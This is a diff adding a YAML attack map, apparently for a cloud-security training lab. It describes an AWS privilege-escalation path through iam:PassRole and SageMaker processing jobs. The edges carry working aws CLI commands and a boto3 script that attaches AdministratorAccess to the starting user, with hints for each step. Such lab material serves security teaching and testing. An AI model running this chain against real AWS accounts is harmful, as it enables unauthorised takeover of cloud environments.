@@ -1,0 +1,97 @@
+attackMap:
+  nodes:
+    - id: starting-user
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-sagemaker-003-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has iam:PassRole permission on the admin-privileged SageMaker
+        execution role and sagemaker:CreateProcessingJob permission, as well as s3:PutObject
+        access to the staging bucket. These permissions together allow you to run arbitrary
+        code with administrative privileges via a SageMaker processing job.
+
+    - id: s3-bucket
+      label: "S3 Staging Bucket"
+      type: resource
+      subType: s3-bucket
+      arn: "arn:aws:s3:::pl-prod-sagemaker-003-to-admin-bucket-{account_id}-{suffix}"
+      description: >
+        This S3 bucket is used to stage the malicious processing script that will be
+        executed by the SageMaker processing job. The starting user has s3:PutObject
+        permission on this bucket, allowing them to upload arbitrary Python code.
+
+    - id: passable-role
+      label: "Admin Passable Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-sagemaker-003-to-admin-passable-role"
+      description: >
+        This IAM role has AdministratorAccess and its trust policy allows
+        sagemaker.amazonaws.com to assume it. By passing this role to a SageMaker
+        processing job, any code executed in that job runs with full administrative
+        permissions in the AWS account. The malicious processing script executes with
+        this role's credentials, attaching AdministratorAccess to the starting user
+        and completing the privilege escalation.
+
+  edges:
+    - from: starting-user
+      to: s3-bucket
+      label: "s3:PutObject"
+      description: >
+        Upload a malicious Python processing script to the S3 bucket. The script uses
+        boto3 to attach AdministratorAccess to the starting user or perform other
+        privilege escalation actions.
+      hints:
+        - "Upload your malicious script here before creating the processing job."
+        - "The script will run with the permissions of the role passed to the processing job."
+      commands:
+        - description: "Create the malicious processing script"
+          command: |
+            cat > /tmp/processing_script.py << 'EOF'
+            import boto3
+            import os
+            iam = boto3.client('iam')
+            iam.attach_user_policy(
+                UserName='pl-prod-sagemaker-003-to-admin-starting-user',
+                PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+            )
+            EOF
+        - description: "Upload the malicious script to S3"
+          command: "aws s3 cp /tmp/processing_script.py s3://pl-prod-sagemaker-003-to-admin-bucket-{account_id}-{suffix}/scripts/processing_script.py"
+
+    - from: starting-user
+      to: passable-role
+      label: "iam:PassRole + sagemaker:CreateProcessingJob"
+      description: >
+        Create a SageMaker processing job that passes the admin-privileged role as the
+        execution role. The processing job will run the uploaded malicious script inside
+        a container that has the admin role's credentials available via the instance
+        metadata service.
+      hints:
+        - "You can create SageMaker processing jobs and pass roles to them."
+        - "Look for roles with administrative permissions that trust sagemaker.amazonaws.com."
+        - "Upload a malicious processing script to S3, then launch a job with the admin role to escalate privileges."
+        - "Browse to https://pathfinding.cloud/paths/sagemaker-003 for technique details."
+      commands:
+        - description: "Create the SageMaker processing job with the admin role"
+          command: |
+            aws sagemaker create-processing-job \
+              --processing-job-name pl-prod-sagemaker-003-exploit-job \
+              --processing-resources '{"ClusterConfig":{"InstanceCount":1,"InstanceType":"ml.t3.medium","VolumeSizeInGB":1}}' \
+              --app-specification '{"ImageUri":"763104351884.dkr.ecr.us-east-1.amazonaws.com/pytorch-training:1.8.1-cpu-py36-ubuntu18.04","ContainerEntrypoint":["python3","/opt/ml/processing/input/code/processing_script.py"]}' \
+              --processing-inputs '[{"InputName":"code","S3Input":{"S3Uri":"s3://pl-prod-sagemaker-003-to-admin-bucket-{account_id}-{suffix}/scripts/","LocalPath":"/opt/ml/processing/input/code","S3DataType":"S3Prefix","S3InputMode":"File"}}]' \
+              --processing-output-config '{"Outputs":[{"OutputName":"output","S3Output":{"S3Uri":"s3://pl-prod-sagemaker-003-to-admin-bucket-{account_id}-{suffix}/output/","LocalPath":"/opt/ml/processing/output","S3UploadMode":"EndOfJob"}}]}' \
+              --role-arn arn:aws:iam::{account_id}:role/pl-prod-sagemaker-003-to-admin-passable-role
+        - description: "Monitor job status until completion"
+          command: "aws sagemaker describe-processing-job --processing-job-name pl-prod-sagemaker-003-exploit-job --query 'ProcessingJobStatus'"
+        - description: "Verify admin access after job completes"
+          command: "aws iam list-users --max-items 1"
